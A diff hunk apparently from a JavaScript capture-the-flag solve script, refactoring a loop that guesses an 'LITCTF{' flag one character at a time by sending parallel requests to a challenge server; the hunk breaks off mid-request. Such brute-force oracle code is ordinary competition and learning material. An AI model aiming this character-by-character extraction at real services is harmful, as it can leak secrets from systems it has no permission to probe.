@@ -29,7 +29,7 @@ await (async () => {
     const chars = [..."}abcdefghijklmnopqrstuvwxyz"];
     let flag = "LITCTF{";
     while (true) {
-        const res = await Promise.all([..."}abcdefghijklmnopqrstuvwxyz"].map(async c=>
+        const res = await Promise.all(chars.map(async c=>
             (
                 await (
                     await fetch("http://litctf.live:31770/", {
